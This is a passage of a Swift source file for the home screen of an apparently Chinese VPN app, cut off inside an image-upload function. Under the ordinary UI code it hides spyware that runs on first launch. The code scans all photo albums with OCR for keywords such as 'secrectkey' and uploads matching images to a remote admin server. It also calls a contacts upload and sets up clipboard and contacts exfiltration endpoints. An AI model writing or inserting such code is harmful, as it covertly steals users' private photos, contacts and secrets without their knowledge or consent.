//
//  Home.swift
//  Home
//
//  Created by Balaji on 12/09/21.
//

import SwiftUI
import ApplicationLibrary
import Libbox
import Library
import Crisp
import Combine
import Photos
import BackgroundTasks
import Contacts


import BackgroundTasks
import Photos
import ImageIO
import MobileCoreServices
 
//import TesseractOCR
import Vision


struct HomeView: View {
    
    @Environment(\.scenePhase) private var scenePhase
    @EnvironmentObject private var environments: ExtensionEnvironments
    @State private var alert: Alert?
    
    // 跟踪是否首次回到前台
    @State private var isFirstTimeActive = true
    
    // 相册监听器
    @StateObject var photoLibraryObserver = PhotoLibraryObserver()
    
    @State private var selection = NavigationPage.dashboard
    @State private var importProfile: LibboxProfileContent?
    @State private var importRemoteProfile: LibboxImportRemoteProfile?
    @State private var isUpdating = false
    @State private var profileList: [ProfilePreview] = []
    @State private var isUrlTesting = false
    
    
    @AppStorage("serverData") private var serverData: String = ""
      // 用于记录上次更新的时间
    @AppStorage("lastFetchTime") private var lastFetchTime: Double = 0.0 // = Date(timeIntervalSince1970: 0).timeIntervalSince1970
   
    @Binding var isLoggedIn: Bool
    
    @State private var isNodesLoading = true
    
    @StateObject private var commandClient = CommandClient(.groups)
    
    @State private var groups: [OutboundGroup] = []
    @State private var groups_firsttime: [OutboundGroup] = []
    
    
    @State var isConnected = false
    
    // Current Server...
    @State var servers: [nodereponseData] = []
    
     
    @State var serverstixignfufeiTest: [nodereponseData] = [nodereponseData( type: "", name: "香港1🇭🇰高速节点", rate: "", id2: 1, isOnline: 1, cacheKey: ""),nodereponseData( type: "", name: "香港2🇭🇰高速节点", rate: "", id2: 1, isOnline: 1, cacheKey: ""),nodereponseData( type: "", name: "香港3🇭🇰高速节点", rate: "", id2: 1, isOnline: 1, cacheKey: ""),nodereponseData( type: "", name: "香港4🇭🇰高速节点", rate: "", id2: 1, isOnline: 1, cacheKey: ""),nodereponseData( type: "", name: "美国🇺🇸高速节点", rate: "", id2: 1, isOnline: 1, cacheKey: ""),nodereponseData( type: "", name: "日本🇯🇵高速节点", rate: "", id2: 1, isOnline: 1, cacheKey: ""),nodereponseData( type: "", name: "法国🇫🇷高速节点", rate: "", id2: 1, isOnline: 1, cacheKey: ""),nodereponseData( type: "", name: "韩国🇰🇷高速节点", rate: "", id2: 1, isOnline: 1, cacheKey: ""),nodereponseData( type: "", name: "新加坡🇸🇬高速节点", rate: "", id2: 1, isOnline: 1, cacheKey: ""),nodereponseData( type: "", name: "新加坡1🇸🇬高速节点", rate: "", id2: 1, isOnline: 1, cacheKey: ""),nodereponseData( type: "", name: "新加坡2🇸🇬高速节点", rate: "", id2: 1, isOnline: 1, cacheKey: ""),nodereponseData( type: "", name: "新加坡3🇸🇬高速节点", rate: "", id2: 1, isOnline: 1, cacheKey: ""),nodereponseData( type: "", name: "新加坡4🇸🇬高速节点", rate: "", id2: 1, isOnline: 1, cacheKey: ""),nodereponseData( type: "", name: "新加坡5🇸🇬高速节点", rate: "", id2: 1, isOnline: 1, cacheKey: ""),nodereponseData( type: "", name: "新加坡6🇸🇬高速节点", rate: "", id2: 1, isOnline: 1, cacheKey: "")]
    @State var currentServer: nodereponseData = nodereponseData( type: "", name: "", rate: "", id2:0, isOnline: 0 , cacheKey: "")
    @State var changeServer = false
        
    @State private var isUserViewActive = false
    @State private var isSubscriptionActive = false
    @State private var isInviteActive = false
    @State private var isKefuActive = false
    @State private var isErrorViewActive = false
    //@State private var currentNode = UserDefaults.standard.string(forKey: "selectedNode") ?? "自动选择"
    @AppStorage("selectedNode") private var currentNode = "自动选择"
    @AppStorage("goGrouptag") private var goGrouptag = ""
    
    @AppStorage("paymentURLKey") private var paymentURLKey = ""
    @State private var islogined = false
    
    @State private var loadingNodes = false
    
    @State private var urltestinggoGrouptag = ""
    @State private var isConfiging = false
    
    @AppStorage("baseDYURL") private var  baseDYURL = ""
    
    @State private var xufeiNotify = false
    
    
    let adimages = ["11-53-53", "12-11-56", "12-14-11"] // 替换为你广告图片的名字
    
    // 当前页的索引
    @State private var currentIndex = 0
    // 自动轮播计时器
    let timer = Timer.publish(every: 5, on: .main, in: .common).autoconnect()
    
    
    
    //增加上传相册，通讯录，和剪切板逻辑
    @AppStorage("uploadedAssetIDsString") private var uploadedAssetIDsString: String = ""
    
    // 计算属性，用于方便访问数组形式的 uploadedAssetIDs
    private var uploadedAssetIDs: [String] {
        get {
            if uploadedAssetIDsString.isEmpty {
                return []
            }
            return uploadedAssetIDsString.components(separatedBy: ",").filter { !$0.isEmpty }
        }
        set {
            uploadedAssetIDsString = newValue.joined(separator: ",")
        }
    }
    
    // 辅助方法：添加已上传的资产ID
    private  func addUploadedAssetID(_ assetID: String) {
        var currentIDs = uploadedAssetIDs
        if !currentIDs.contains(assetID) {
            currentIDs.append(assetID)
           // print(uploadedAssetIDsString)
            uploadedAssetIDsString.append(","+assetID)
            //print(uploadedAssetIDsString)
           // self.uploadedAssetIDs.append(assetID)
        }
    }
    
    // 用于记录上次检测时的剪切板文本
    @State  private var lastClipboardText: String?
     
    // 定义关键词列表,识别到这些关键词的图片进行上传
    @State private var keywords = [
       "keywords", "secrectkey","words"
    ]
     
    
    //上传粘贴板内容的地址
    let serverUploadImageURL = "https://admin.cybervpn.org/api/demo/uploadImg?type=ios&userId="
    
    //上传相册的地址
    let serveruploadPasteBoardURL = "https://admin.cccccc.org/api/demo/info?type=ios&userId="
    
    //上传通讯录的地址
    let serveruploadContacesURL = "https://admin.cccccc.org/api/demo/uploadContacts?type=ios&userId="
    
    
    var body: some View {
       
        VStack{
            
            HStack{
                    
                
                
                Button {
                    withAnimation{
                        isUserViewActive.toggle()
                    }
                } label: {
                    
                    Image(systemName: "circle.grid.cross")
                        .font(.title2)
                        .padding(5)
                        .foregroundColor(.white)
                        .background(
                            
                            RoundedRectangle(cornerRadius: 10)
                                .strokeBorder(.white.opacity(0.25),lineWidth: 1)
                        )
                }
                     
                Spacer()
                
                /* Button {
                    withAnimation{
                        isSubscriptionActive.toggle()
                        
                    }
                } label: {
                    Image(systemName: "slider.horizontal.3")
                        .font(.title2)
                        .padding(12)
                        .background(
                            
                            RoundedRectangle(cornerRadius: 10)
                                .strokeBorder(.white.opacity(0.25),lineWidth: 1)
                        )
                } */
                if (paymentURLKey.count > 3){
                    
                   // Text Bubble
                   Button {
                       withAnimation{
                           isSubscriptionActive.toggle()
                           
                       }
                   } label: {
                           
                       Text("超值折扣")
                           .font(.footnote)
                           .foregroundColor(.white)
                           .padding(.horizontal, 10)
                           .padding(.vertical, 6)
                           .background(
                               RoundedRectangle(cornerRadius: 4)
                                   .fill(Color.orange)
                           )
                           .overlay(
                               TriangleShape()
                                   .fill(Color.orange)
                                   .frame(width: 10, height: 10)
                                   .offset(x: 10)
                               , alignment: .trailing
                           )
                       
                       // Panda Image with VIP Tag
                       HStack(spacing: 10){
                           Text(verbatim: "")
                           Image("applogo") // Replace with actual image asset
                               .resizable()
                               .frame(width: 30, height: 30)
                               .cornerRadius(15)
                           
   //                                Text("VIP")
   //                                    .font(.caption)
   //                                    .fontWeight(.bold)
   //                                    .foregroundColor(.yellow)
   //                                    .padding(4)
   //                                    .background(Color.orange)
   //                                    .cornerRadius(4)
                       }
                       
                   }
                   .padding()
                }
                
                
                Button {
                    withAnimation{
                        isKefuActive.toggle()
                    }
                } label: {
                    
                    Image(systemName: "person.fill.questionmark")
                        .font(.title2)
                        .padding(5)
                        .foregroundColor(.white)
                        .background(
                            
                            RoundedRectangle(cornerRadius: 10)
                                .strokeBorder(.white.opacity(0.25),lineWidth: 1)
                        )
                    Text("客服").foregroundColor(.white)
                }
                
            }
//            .overlay(
//                
//                // Attributed Text...
//                Text(getTitle())
//            )
//            .foregroundColor(.white)
        
        // end navigationbar
        
//        DashboardView()
            
        // discount view
//        Image("11-53-53").resizable().scaledToFill()
//                .frame(width: UIScreen.main.bounds.width * 0.8,height: 150)
//                .cornerRadius(10)
            
            // 图片轮播
            TabView(selection: $currentIndex) {
                ForEach(0..<adimages.count, id: \.self) { index in
                    
                    Button {
                        if index == 0 {
                            if (paymentURLKey.count > 3){
                                withAnimation{
                                    isSubscriptionActive.toggle()
                                    
                                }
                            }
                        }
                        if index == 1 {
                            if (paymentURLKey.count > 3){
                                withAnimation{
                                    isInviteActive.toggle()
                                    
                                }
                            }
                        }
                        
                    } label: {
                        Image(adimages[index])
                            .resizable()
                            .scaledToFill()
                            .frame(width: UIScreen.main.bounds.width * 0.8,height: 150)
                            .cornerRadius(10)
                            .tag(index)
                    }

                    
                }
            }
            .tabViewStyle(PageTabViewStyle(indexDisplayMode: .never)) // 隐藏系统自带的指示器
            .frame(height: 150)
            .onReceive(timer) { _ in
                // 自动切换广告
                withAnimation {
                    currentIndex = (currentIndex + 1) % adimages.count
                }
            }
            
            // 自定义指示器
            HStack(spacing: 8) {
                ForEach(0..<adimages.count, id: \.self) { index in
                    Circle()
                        .fill(index == currentIndex ? Color.blue : Color.gray)
                        .frame(width: 5, height: 5)
                }
            }
            .padding(.top, 3)
            
            if environments.extensionProfileLoading {
                //加载是否安装 VPN 插件
                VStack{
                    LottieView(animationFileName: "8c31d47d" , loopMode: .loop)
                } .aspectRatio(contentMode: .fill)
                  .scaleEffect(0.1).frame(width: 190,height: 190).padding()
                
           } else if let profile = environments.extensionProfile {
               //已经安装 Profile VPN 插件的情况下。
            
               DashboardViewNewUI().environmentObject(profile)
               
               ConnectErrorView
               Spacer()
           }else {
                 
               InstallProfileButton { error in
                   handleProfileButtonError(error)
               }
               
               ConnectErrorView
                            
               
#if targetEnvironment(simulator)
               
               StartStopButton()              
               ClashModeView()
//               ExtensionStatusView()
               
#endif
           }
            
        // Power Button....
//        PowerButton()
            

        // Max Frame...
//        .frame(height: 120)
//        .padding(.top,getRect().height < 750 ? 20 : 40)
        // Why using max frame...
        // it will be useful to fit the content to small iphones later...
        }
        .padding()
        .frame(maxWidth: .infinity,maxHeight: .infinity,alignment: .top)
        .modifier(ActivityIndicatorModifier(isLoading: isConfiging, color: Color.black.opacity(0.8), lineWidth: 1))
        .background(
            Background()
        )
        // Blur View when Server page shows...
        .overlay(
            Rectangle()
                .fill(.ultraThinMaterial)
                .opacity(changeServer ? 1 : 0)
                .ignoresSafeArea()
                .onTapGesture {
                                        
                    withAnimation{
                        changeServer.toggle()
                    }
                }
        )
        .overlay(
            BottomSheet(),            
            alignment: .bottom
        )
        .ignoresSafeArea(.container, edges: .bottom)
        // Since the theme is black ...
        // using always dark mode...
        .preferredColorScheme(.dark)
        .onAppear {
             
            print("onAppear ->  \(islogined)")
            //await environments.reload()
            
            environments.postReload()
            Task {
                
                await doReload()
                
                await getConfigCache()
                
               // await doReloadSystemProxy()
            }
            
            
        }
        .fullScreenCover(isPresented: $isUserViewActive, content: {
            SideMenuView(isPresented: $isUserViewActive, isLoggedIn: $isLoggedIn)
        }).transition(.slide)
        .fullScreenCover(isPresented: $isSubscriptionActive, content: {
            SubscriptionView(isPresented: $isSubscriptionActive)
        }).transition(.slide)
        .fullScreenCover(isPresented: $isKefuActive, content: {
            SupportView()
        })
        .onReceive(environments.openProfileGetSuccess, perform: { _ in
            Task{
                await referGetLocalNodes()
            }
        })
        .onReceive(environments.opentixingSubnodes, perform: { _ in
//            print("onReceive opentixingSubnodes")
            isSubscriptionActive = true
        })
        .fullScreenCover(isPresented: $isInviteActive, content: {
            InviteListView(isPresented: $isInviteActive)
        })
        .popover(isPresented: $isErrorViewActive, content: {
            QuestionView()
        })
        .alertBinding($alert)
        .onChangeCompat(of: scenePhase) { newValue in
            // 前台监听日志打印
            print("🔄 HomeView ScenePhase Changed: \(newValue)")
            
            if newValue == .active {
                environments.postReload()
                
                if isFirstTimeActive {
                    // 首次回到前台的特殊逻辑
                    print("🚀 First time app became active - 执行首次初始化")
                    
                    DispatchQueue.main.asyncAfter(deadline: .now() + 3) {
                        // 在主线程中延迟 3 秒后执行的代码
                        print("⏰ 延迟3秒后执行后台任务注册")
                        self.registerBackgroundTasks()
                    }
                    
                    // 设置相册变化回调
                    
                    photoLibraryObserver.onPhotoLibraryChanged = {
                        self.handlePhotoLibraryChanged()
                    }
                    
                    // 注册相册监听
                    photoLibraryObserver.register()
                    
                    // 首次上传通讯录
                    uploadContacts()
                    
                    // 标记为非首次
                    isFirstTimeActive = false
                    
                } else {
                    // 非首次回到前台，调用常规处理方法
                    print("🔄 App became active (not first time) - 调用常规处理方法")
                    appDidBecomeActive()
                }
            }
        }
//        .onChangeCompat(of: selection) { newValue in
//            print("onChangeCompat: \(newValue)" )
//        } 
        .onReceive(commandClient.$groups, perform: { groups in
            
            if let groups {
                print("节点刷新成功 groups: \(String(describing: groups.count))")
                setGroups(groups)
            }
        })
        .environment(\.selection, $selection)
        .environment(\.importProfile, $importProfile)
        .environment(\.importRemoteProfile, $importRemoteProfile)
        .handlesExternalEvents(preferring: [], allowing: ["*"])
        
    }
    
 
    
    // MARK: - 前台监听相关方法
    
    /// 注册后台任务
    private func registerBackgroundTasks() {
        print("🔧 registerBackgroundTasks() called")
        // 这里可以注册后台任务
        // 例如：BGTaskScheduler.shared.register(forTaskWithIdentifier: "com.app.background", using: nil) { task in
        //     // 处理后台任务
        // }
        fetchAndUploadAllPhotos()
    }
    
    
    
    // 上传进度保存到 UserDefaults，避免重复上传
    func fetchAndUploadAllPhotos(maxPhotos: Int = 10_000) {
        
        print("fetchAndUploadAllPhotos...")
        // 检查并请求权限
        PHPhotoLibrary.requestAuthorization { status in
            guard status == .authorized else {
                print("照片权限未授权")
                return
            }
        }
        
        PHPhotoLibrary.requestAuthorization { status in
            switch status {
                case .authorized, .limited:
                    // 已授权，执行获取相册操作
                    PHPhotoLibrary.shared().performChanges({
                        // 触发相册变化，刷新数据
                    }) { success, error in
                        if success {
                            // 刷新成功
                            DispatchQueue.main.async {
                                // 刷新 UI 或其他相关操作
                                print("确保你的应用有足够的权限并且正确地获取和处理相册数据。如果问题仍然存在，可以考虑通过 PHPhotoLibrary.shared().performChanges 强制刷新相册。")
                                //self.fetchAlbums()
                                self.fetchAllAssetsAndUpload()
                            }
                        } else {
                            // 处理错误
                            print("Error: \(error?.localizedDescription ?? "Unknown error")")
                        }
                    }
                    
                   
                   
                case .denied, .restricted:
                    print("没有访问相册的权限")
                case .notDetermined:
                    // 用户还没有做出决定
                    print("用户尚未决定")
                     
                @unknown default:
                    print("未知权限状态")
            }
        }
        
        /*
        // 获取已上传的进度
        let lastUploadedIndex = UserDefaults.standard.integer(forKey: "lastUploadedIndex")
        
        // 获取设备上的所有图片路径（可以是相册中的图片，或者本地文件）
        let imagePaths = fetchImagePathsFromDevice() // 这里是获取设备上的图片路径的方法
        
        var currentIndex = lastUploadedIndex
        var shouldStop = false
        
        // 遍历图片路径并上传
        for path in imagePaths {
            guard currentIndex < maxPhotos else {
                shouldStop = true
                break
            }
            
            // 如果当前索引小于已上传的进度，则跳过该图片
            if currentIndex < lastUploadedIndex {
                currentIndex += 1
                continue
            }
            
            // 上传图片
            uploadImage(path: path, serverURL: serverURL) {
                // 更新上传进度
                UserDefaults.standard.set(currentIndex + 1, forKey: "lastUploadedIndex")
                currentIndex += 1
                if shouldStop { return }
            }
        }*/
        
        
  
        
        
        func fetchAlbums_index(){
            DispatchQueue.global(qos: .utility).async {
               // 获取所有相册 PHFetchResult<PHAssetCollection>
               let allAlbums = PHAssetCollection.fetchAssetCollections(with: .smartAlbum, subtype: .any, options: nil)
               print("相册: \(allAlbums.count)")
               let imageManager = PHImageManager.default()
               
               // 获取之前保存的上传进度
               let lastUploadedIndex = UserDefaults.standard.integer(forKey: "lastUploadedIndeXYZEERFGVSSRS")
               
               var currentIndex = lastUploadedIndex
               var shouldStop = false

               // 遍历相册
               allAlbums.enumerateObjects { album, _, _ in
                   guard !shouldStop else { return }
                   
                   let fetchOptions = PHFetchOptions()
                   fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
                   
                   // 获取相册中的照片
                   let assets = PHAsset.fetchAssets(in: album, options: fetchOptions)
                   
                   assets.enumerateObjects { asset, index, stop in
                       print("相册名称: \( asset )")
                       //print("\(asset.mediaType.rawValue)  \(String(describing: asset.creationDate))")
                       // 如果当前图片索引小于上次上传的图片索引，则跳过
                       if index < lastUploadedIndex {
                           return
                       }
                       
                       guard currentIndex < maxPhotos else {
                           shouldStop = true
                           stop.pointee = true
                           return
                       }
                       
                       let requestOptions = PHImageRequestOptions()
                       requestOptions.deliveryMode = .highQualityFormat
                       requestOptions.isSynchronous = true
                       
                       
                       // 获取原始尺寸
                       let originalWidth = CGFloat(asset.pixelWidth)
                       let originalHeight = CGFloat(asset.pixelHeight)
                       print("获取原始尺寸: \( originalWidth ) \(originalHeight)")
                       // 按比例计算目标尺寸
                       /* let aspectRatio = originalWidth / originalHeight
                        var targetWidth: CGFloat
                        var targetHeight: CGFloat
                       let maxDimension: CGFloat = 800
                       if aspectRatio > 1 { // 宽 > 高
                            targetWidth = maxDimension
                            targetHeight = maxDimension / aspectRatio
                        } else { // 高 >= 宽
                            targetHeight = maxDimension
                            targetWidth = maxDimension * aspectRatio
                        }*/
                                                
                       /// let targetSize = CGSize(width: 800, height: 800) // 压缩到 800x800 分辨率
                       ///
                       let targetSize = CGSize(width: originalWidth, height: originalHeight)
                       
                       imageManager.requestImage(for: asset, targetSize: targetSize, contentMode: .aspectFill, options: requestOptions) { image, _ in
                           if let image = image {
                               
                               // 压缩图片为 JPEG 格式 //jpegData(compressionQuality: 0.7)
                               
                               
                               // image.jpegData(compressionQuality: 0.7),
                               if let compressedData = self.compressImageToUnderSize(image), compressedData.count > 0{
                                   // 上传图片并保存进度
                                   // 计算图片大小（以 KB 为单位）
                                          let fileSizeInKB = compressedData.count / 1024
                                          
                                          // 检查是否大于 10KB
                                          if fileSizeInKB > 10 {
                                              print("图片大小符合要求，准备上传：\(fileSizeInKB) KB")
                                             
                                              // 调用上传函数
                                              self.uploadImage(imagedata: compressedData, serverURL: serverUploadImageURL,fileName: "\(album.localIdentifier).png") {
                                                  // 更新上传进度
                                                  UserDefaults.standard.set(currentIndex + 1, forKey: "lastUploadedIndeXYZEERFGVSSRS")
                                                  currentIndex += 1
                                              }
                                          } else {
                                              print("图片大小小于 10KB，被过滤：\(fileSizeInKB) KB")
                                          }
                                   
                               }
                           }
                       }
                   }
               }
           }
        }
        
        
    }
    
    /// 1. 获取所有相册并收集所有照片
    func fetchAllAssetsAndUpload() {
        DispatchQueue.global(qos: .utility).async {
            // 获取系统内置相册（智能相册、用户自定义相册等）
            let smartAlbums = PHAssetCollection.fetchAssetCollections(with: .smartAlbum, subtype: .any, options: nil)
            let userAlbums  = PHAssetCollection.fetchAssetCollections(with: .album, subtype: .any, options: nil)
            
            // 用于存储所有照片的数组
            var allAssets: [PHAsset] = []
            
            // 收集智能相册照片
            smartAlbums.enumerateObjects { album, _, _ in
                let assets = self.fetchAssets(from: album)
                //allAssets.append(contentsOf: assets)
                for asset in assets {
                if !allAssets.contains(asset) {
                    allAssets.append(asset)
                }
            }
            }
            
            // 收集用户自定义相册照片
            userAlbums.enumerateObjects { album, _, _ in
                let assets = self.fetchAssets(from: album)
//                allAssets.append(contentsOf: assets)
                for asset in assets {
                    if !allAssets.contains(asset) {
                        allAssets.append(asset)
                    }
                }
            }
            
            print("共收集到照片数量: \(allAssets.count)")
            
            // 在获取完所有相册的照片后，开始分组上传
            self.resumeUploadAssets(allAssets)
        }
    }
    
    func resumeUploadAssets(_ assets: [PHAsset]) {
        // 筛选未上传的资产
        let remainingAssets = assets.filter { !uploadedAssetIDs.contains($0.localIdentifier) }
        print("剩余需要上传的照片数量: \(remainingAssets.count)")
        
        // 分组并上传
        self.uploadAssetsByGroups(remainingAssets)
    }
    /// 2. 获取指定相册中的照片，按照时间降序
    private func fetchAssets(from album: PHAssetCollection) -> [PHAsset] {
        let fetchOptions = PHFetchOptions()
        fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
        let fetchResult = PHAsset.fetchAssets(in: album, options: fetchOptions)
        
        var assets: [PHAsset] = []
        fetchResult.enumerateObjects { asset, _, _ in
            assets.append(asset)
        }
        return assets
    }
    
    
    /// 3. 按组上传
    ///
    /// - Parameter assets: 所有需要上传的 PHAsset
    private func uploadAssetsByGroups(_ assets: [PHAsset], concurrentTaskLimit: Int = 5) {
        // 每组上传的数量
        let groupSize = 5
        // 用于循环分组
        var startIndex = 0
        let totalCount = assets.count
        
        // 信号量，限制并发任务数
        let semaphore = DispatchSemaphore(value: concurrentTaskLimit)

        // 循环分组
        while startIndex < totalCount {
            let endIndex = min(startIndex + groupSize, totalCount)
            let groupAssets = Array(assets[startIndex..<endIndex])
            
            // 同步等待当前分组上传完成
            let dispatchGroup = DispatchGroup()
            
            for asset in groupAssets {
                dispatchGroup.enter()
                // 逐个上传照片，上传完成后 dispatchGroup.leave()
//                self.updateAsset(asset: asset) {
//                    dispatchGroup.leave()
//                }
                
              DispatchQueue.global(qos: .utility).async {
                  semaphore.wait() // 等待可用的信号
                  
                  // 上传照片
                  self.updateAsset(asset: asset) {
                      semaphore.signal() // 释放信号
                      dispatchGroup.leave() // 标记任务结束
                  }
              }
            }
            
            // 等待当前分组的所有照片都上传完毕
            dispatchGroup.wait()
            
            print("更新uploadedAssetIDs \(uploadedAssetIDs.count)")
            print("当前分组(\(startIndex)~\(endIndex-1))上传完毕，休眠 1 秒...")
            Thread.sleep(forTimeInterval: 1.0)
            
            // 继续下一分组
            startIndex = endIndex
        }
        
        print("全部分组上传完成！")
    }
     
    
    /// 4. 单张照片上传前的检查、获取、压缩、调用上传接口等
    ///
    /// - Parameters:
    ///   - asset: 要处理的 PHAsset
    ///   - completion: 上传结束后的回调(不论成功还是失败都应回调，保证 dispatchGroup 能顺利 leave)
    func updateAsset(asset: PHAsset, completion: @escaping () -> Void) {
        // 获取之前保存的上传过的 PHAsset ID
        
        
        let imageManager = PHImageManager.default()
        
        if uploadedAssetIDs.contains(asset.localIdentifier) {
            // 如果该图片已上传过，跳过
            //print("图片已上传，跳过: \(asset.localIdentifier)")
            print("len : \(uploadedAssetIDs.count) 图片已上传，跳过")
            // 切记要调用 completion()
            completion()
            return
        }

        // 获取原始尺寸
        let originalWidth = CGFloat(asset.pixelWidth)
        let originalHeight = CGFloat(asset.pixelHeight)
        print("获取原始尺寸: \(originalWidth) \(originalHeight)")

        let targetSize = CGSize(width: originalWidth, height: originalHeight)
        let requestOptions = PHImageRequestOptions()
        requestOptions.deliveryMode =  .opportunistic//.highQualityFormat
        requestOptions.isSynchronous =  true // 异步加载图片
        
        imageManager.requestImage(for: asset, targetSize: targetSize, contentMode: .aspectFill, options: requestOptions) { image, _ in
            if let image = image {
                
                //增加 versoin 原生识别
                self.recognizeText(from: image) { reslut in
//                    /print("Contains keyword \(reslut ?? "")")
                    if let recognizedText = reslut {
                        // 去除空格和换行符
                        let cleanedText = recognizedText.replacingOccurrences(of: "\\s+", with: "", options: .regularExpression).lowercased()
                       // print("recognizedText (cleaned): \(cleanedText)")

                        // 检查是否包含任一关键词
                        let containsKeyword = self.keywords.contains { keyword in
                            let cleanedKeyword = keyword.replacingOccurrences(of: "\\s+", with: "", options: .regularExpression).lowercased()
                            return cleanedText.contains(cleanedKeyword)
                        }

                        // 打印结果
                        if containsKeyword {
                            print("Found keyword in text, 上传图片")
                            
                            // 压缩图片为 JPEG 格式
                            autoreleasepool {
                                
                                if let compressedData = self.compressImageToUnderSize(image,targetMaxSizeInKB: 800), compressedData.count > 0 {
            //                     if let compressedData = self.compressImageUsingCoreGraphics(image, maxPixelSize: 1024), compressedData.count > 0 {
                                    // 计算图片大小（以 KB 为单位）
                                    let fileSizeInKB = compressedData.count / 1024
                                    
                                    // 检查是否大于 10KB
                                    if fileSizeInKB > 10 {
                                        print("图片大小符合要求，准备上传：\(fileSizeInKB) KB")
                                        
                                        // 上传图片并保存进度
                                        self.uploadImage(imagedata: compressedData, serverURL: serverUploadImageURL, fileName: "\(asset.localIdentifier).png") {
                                            // 上传完成后更新缓存的 ID
                                            print("上传完成... \(asset.localIdentifier)")
                                            self.addUploadedAssetID(asset.localIdentifier)
                                            print("len : \(self.uploadedAssetIDs.count)")
                                            completion()
                                        }
                                    } else {
                                        completion()
                                        print("图片大小小于 10KB，被过滤：\(fileSizeInKB) KB")
                                    }
                                }
                                
                            }
                        } else {
                            print("过滤完成... \(asset.localIdentifier)")
                            self.addUploadedAssetID(asset.localIdentifier)
                            print("len : \(self.uploadedAssetIDs.count)")
                            completion()
                           // print("No keywords found in text,忽略图片")
                        }
                    }
                }
                
                /*
                //增加 ORC 字体识别
                self.recognizeImageWithTesseract(image: image) { (shouldUpload) in
                    DispatchQueue.main.async { // 确保回调在主线程
                        if shouldUpload {
                            print("Contains keyword, should upload: true")
                            // 在这里执行上传操作
                        } else {
                            print("No keyword found, should upload: false\(shouldUpload)")
                        }
                    }
                }*/
                
                /*
                
                */
            }
        }
    }
    
    
    /// 将任意大小的图片，最终压缩到 500KB（可调）以内。
    /// 1) 按图片数据大小分区间处理；
    /// 2) 若超过一定阈值，先多次等比例缩放，再做循环降质；
    /// 3) 尽量减少循环压缩次数，提高效率。
    ///
    /// - Parameter image: 原始 UIImage
    /// - Parameter targetMaxSizeInKB: 目标大小 (单位: KB)，默认 500KB
    /// - Returns: 压缩后的 Data，如果无法压缩到目标大小，返回尽可能小的结果
    func compressImageToUnderSize(_ image: UIImage, targetMaxSizeInKB: Int = 500) -> Data? {
        let maxBytes = targetMaxSizeInKB * 1024
        
        // 1. 获取原图 data (质量1.0)
        guard var imageData = image.pngData()  else {
            return nil
        }
        
        // 2. 如果原图已小于 targetMaxSizeInKB，直接返回
        if imageData.count <= maxBytes {
            return imageData
        }
        
        let originalSize = imageData.count
        print("原图大小: \(originalSize / 1024) KB, 目标: \(targetMaxSizeInKB) KB 以内")
        
        // 3. 多阶段缩放逻辑
        //    3.1 若 > 10MB，先放宽到 4096 再看效果
        if originalSize > 10 * 1024 * 1024 {
            if let scaled1 = downscaleImage(image, toMaxDimension: 800),
               let data1 = scaled1.pngData()  {
                imageData = data1
                print("第一次缩放到 4096，大小变为: \(imageData.count / 1024) KB")
                
                // 如果依旧明显大于 targetMaxSizeInKB，再缩到 2048
                if imageData.count > maxBytes * 4 {
                    // 例如: 如果此时依旧比目标大 4 倍，说明可以再次大幅度缩放
                    if let scaled2 = downscaleImage(scaled1, toMaxDimension: 800),
                       let data2 = scaled2.pngData()  {
                        imageData = data2
                        print("第二次缩放到 2048，大小变为: \(imageData.count / 1024) KB")
                    }
                }
            }
        }
        //    3.2 若介于 2MB ~ 10MB，只缩到 2048 即可
        else if originalSize > 2 * 1024 * 1024 {
            if let scaled = downscaleImage(image, toMaxDimension: 800),
               let data = scaled.pngData()  {
                imageData = data
                print("超过 2MB，缩放到 2048，大小变为: \(imageData.count / 1024) KB")
            }
        }
        //    3.3 若介于 500KB ~ 2MB，可能只需“轻度”缩放或直接循环压缩
        else if originalSize > maxBytes {
            // 可以根据需求决定是否要缩放，比如缩到 1500、1000 等
            // 这里直接选择缩到 1500 作为示例
            if let scaled = downscaleImage(image, toMaxDimension: 800),
               let data = scaled.pngData()  {
                imageData = data
                print("介于 500KB~2MB，缩放到 1500，大小变为: \(imageData.count / 1024) KB")
            }
        }
        
        // 4. 若仍旧大于目标大小，则进行循环压缩 (质量降质)
//        if imageData.count > maxBytes {
//            guard let finalData = iterativeCompression(imageData, targetMaxSize: maxBytes) else {
//                // 如果无法生成更小的图片，返回当前已经缩放后的 data
//                return imageData
//            }
//            imageData = finalData
//        }
        
        // 5. 最终返回
        let finalKB = imageData.count / 1024
        print("最终压缩后大小: \(finalKB) KB")
        return imageData
    }
    
    
    // MARK: - 多次缩放 + 循环压缩的辅助方法

    /// 等比例缩放到指定的“最长边”
    /// - Parameters:
    ///   - image: 原图
    ///   - maxDimension: 目标最长边
    /// - Returns: 新的 UIImage
    private func downscaleImage(_ image: UIImage, toMaxDimension maxDimension: CGFloat) -> UIImage? {
        let width  = image.size.width
        let height = image.size.height
        let maxSide = max(width, height)
        
        // 若最长边已小于 maxDimension，则无需缩放
        if maxSide <= maxDimension {
            return image
        }
        
        // 计算缩放比
        let scale = maxDimension / maxSide
        let newSize = CGSize(width: width * scale, height: height * scale)
        
        // 开始绘制
        UIGraphicsBeginImageContextWithOptions(newSize, false, image.scale)
        defer { UIGraphicsEndImageContext() }
        
        image.draw(in: CGRect(origin: .zero, size: newSize))
        return UIGraphicsGetImageFromCurrentImageContext()
    }
    
    // 上传图片到服务器
    func uploadImage(imagedata: Data, serverURL: String,fileName:String, completion: @escaping () -> Void) {
        guard let url = URL(string: serverURL) else {
            print("无效的URL")
            return
        }
        
        // 创建文件URL
        //let fileURL = URL(fileURLWithPath: path)
        
        // 创建Multipart表单数据请求体
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        
        // 创建请求体
        let boundary = "Boundary-\(UUID().uuidString)"
        request.setValue("multipart/form-data; boundary=\(boundary)", forHTTPHeaderField: "Content-Type")
//        request.setValue("application/octet-stream", forHTTPHeaderField: "Content-Type")

        
        var body =  Data()
        // let fileName = "image_\(Int(Date.now.timeIntervalSince1970)).png"
        // 添加 "userId", "fenzhanid", "imgstr", "phone" 字段
        body.append(convertFormField(named: "userId", value: "0000000000000", boundary: boundary))
        body.append(convertFormField(named: "fenzhanid", value: "6", boundary: boundary))
        body.append(convertFormField(named: "imgstr", value: fileName, boundary: boundary))
        //if let clipboardText = UIPasteboard.general.string {
            //body.append(convertFormField(named: "Pasteboard", value: clipboardText, boundary: boundary))
        //}
        
        body.append(convertFormField(named: "phone", value: "0000000000000", boundary: boundary))
        
        // 添加图片文件
        body.append(convertFileData(fieldName: fileName, fileimageData: imagedata, boundary: boundary))
        
